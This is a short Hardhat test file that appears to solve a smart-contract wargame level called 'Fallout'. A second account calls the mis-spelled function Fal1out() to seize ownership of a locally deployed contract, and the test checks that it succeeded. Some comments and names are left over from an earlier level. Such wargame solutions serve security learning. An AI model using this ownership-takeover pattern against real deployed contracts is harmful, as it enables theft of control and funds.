const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require( "chai" );
const { ethers } = require("hardhat");

describe("Fallback", function () {
    // Deploys the Fallback contract
    async function deployFallback() {
        const [owner, otherAccount] = await ethers.getSigners();
        const Level2 = await hre.ethers.getContractFactory("Fallout");
        const level2 = await Level2.deploy();
      
        await level2.deployed();
      
        console.log(
          `Level2 deployed at address ${level2.address}`
        );

        return {level2, owner, otherAccount};
    }

    /*
    Claim ownership of the contract below to complete this level.
    */
    describe("Solve", function() {
        it("Should solve level2", async function() {
            const {level2, owner, otherAccount} = await loadFixture(deployFallback);
            // call contribute() and ensure our contribution is updated
            // call Fal1out which should make us the owner
            await level2.connect(otherAccount).Fal1out();
            const new_owner = await level2.owner();
            expect(new_owner).equals(otherAccount.address)
        })
    });
});